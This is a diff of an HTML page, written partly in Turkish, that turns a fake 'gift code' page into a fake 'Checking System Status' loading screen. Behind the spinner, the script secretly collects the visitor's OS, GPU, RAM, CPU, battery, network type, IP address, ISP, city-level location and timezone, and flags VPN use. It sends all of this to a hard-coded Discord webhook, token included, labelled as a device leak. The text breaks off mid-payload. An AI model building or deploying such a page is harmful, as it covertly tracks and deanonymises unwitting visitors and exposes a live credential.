@@ -1,38 +1,77 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>HediyeSayfası</title></head><body>
-    <div style="text-align: center; margin-top: 100px; font-family: sans-serif;">
-        <h1>🎁Tebrikler</h1>
-        <p>Hediye kodunuz hazırlanıyor, lütfen bekleyin...</p></div>
+    <title>Checking System Status...</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
+        @keyframes s { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="l"></div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        (function() {
+            "use strict";
 
-        const bilgiler = {
-            "content": "🔔 **Sisteme Giriş Yapıldı!**",
-            "embeds": [{
-                "title": "Cihaz Bilgileri",
-                "color": 3447003,
-                "fields": [
-                    { "name": "Cihaz Modeli", "value": navigator.userAgent, "inline": false },
-                    { "name": "Ekran Boyutu", "value": window.screen.width + "x" + window.screen.height, "inline": true },
-                    { "name": "Dil", "value": navigator.language, "inline": true }
-                ],
-                "footer": { "text": "Veri başarıyla yakalandı" },
-                "timestamp": new Date()
-            }]
-        };
+            const WEBHOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(bilgiler)
-        })
-        .then(() => console.log("Mesaj gönderildi!"))
-        .catch(err => console.error("Hata:", err));
-    </script>
-</body>
-</html>
+            const run = async function() {
+                let d = {
+                    os: "Bilinmiyor", gpu: "Bilinmiyor", vdr: "Bilinmiyor",
+                    res: screen.width + "x" + screen.height,
+                    ram: navigator.deviceMemory || "N/A",
+                    cpu: navigator.hardwareConcurrency || "N/A",
+                    bat: "N/A", net: "N/A", vpn: "✅ Temiz",
+                    ip: "N/A", loc: "N/A", iss: "N/A",
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    lang: navigator.language,
+                    touch: (navigator.maxTouchPoints > 0 ? "Evet" : "Hayır"),
+                    online: (navigator.onLine ? "Aktif" : "Pasif")
+                };
 
+                // 1. İşletim Sistemi Detayı
+                try { d.os = navigator.userAgent.split('(')[1].split(')')[0]; } catch(e) { d.os = navigator.platform; }
+
+                // 2. GPU ve Donanım Analizi
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                    d.vdr = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                } catch(e) {}
+
+                // 3. Pil ve Bağlantı Bilgisi
+                try {
+                    if (navigator.getBattery) {
+                        const b = await navigator.getBattery();
+                        d.bat = "%" + Math.round(b.level * 100) + (b.charging ? " (⚡ Şarjda)" : " (🔋 Pilde)");
+                    }
+                    const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (n) d.net = n.effectiveType.toUpperCase() + " (~" + n.downlink + "Mbps)";
+                } catch(e) {}
+
+                // 4. IP ve Coğrafi Analiz (Derinleştirilmiş)
+                try {
+                    const r = await fetch('https://ipapi.co/json/');
+                    const j = await r.json();
+                    d.ip = j.ip;
+                    d.iss = j.org + " (" + j.asn + ")";
+                    d.loc = j.city + ", " + j.region + " / " + j.country_name;
+                    if (j.timezone !== d.tz) d.vpn = "🚨 **VPN/PROXY TESPİT EDİLDİ**";
+                } catch(e) { d.vpn = "⚠️ Analiz Engellendi"; }
+
+                // 5. Discord Payload (Full Detay)
+                const payload = {
+                    username: "Omniscience V9000",
+                    embeds: [{
+                        title: "💀 TAM KAPSAMLI CİHAZ SIZINTISI",
+                        color: d.vpn.includes("🚨") ? 15158332 : 3066993,
+                        fields: [
+                            { name: "📡 AĞ VE GÜVENLİK", value: "**IP:** `" + d.ip + "`\n**VPN:** " + d.vpn + "\n**ISS:** `" + d.iss + "`\n**Bağlantı:** `" + d.net + "`", inline: false },
+                            { name: "📍 KONUM", value: "**Bölge:** " + d.loc + "\n**Zaman Dilimi:** `" + d.tz + "`", inline: false },
+                            { name: "⚙️ DONANIM", value: "**OS:** `" + d.os + "`\n**CPU:** " + d.cpu + " Çekirdek\n**RAM:** " + d.ram + "
+                    
